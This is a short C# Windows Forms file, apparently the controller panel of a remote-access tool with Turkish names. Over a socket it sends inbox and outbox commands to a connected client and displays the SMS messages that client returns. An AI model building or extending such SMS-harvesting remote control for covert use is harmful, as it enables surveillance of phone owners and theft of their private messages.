using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace SV
{
    public partial class SMSYoneticisi : Form
    {
        public string uniq_id = "";
        Socket sck;
        public SMSYoneticisi(Socket sock, string id)
        {
            InitializeComponent();
            sck = sock;
            uniq_id = id;
        }

        private void listView1_DoubleClick(object sender, EventArgs e)
        {
            if(listView1.SelectedItems.Count > 0)
            {
                try
                {
                    new Goruntule(listView1.SelectedItems[0].SubItems[0].Text,
                        listView1.SelectedItems[0].SubItems[1].Text).Show();
                }
                catch (Exception) { }
            }
        }

        private void gelenSMSToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try { 
            byte[] gidecek = Encoding.UTF8.GetBytes("GELENKUTUSU|");
            Gonderici.Send(sck, gidecek, 0, gidecek.Length, 59999);
            }
            catch (Exception) { }
        }

        private void gidenSMSToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try { 
            byte[] gidecek = Encoding.UTF8.GetBytes("GIDENKUTUSU|");
            Gonderici.Send(sck, gidecek, 0, gidecek.Length, 59999);
            }
            catch (Exception) { }
        }
    }
}
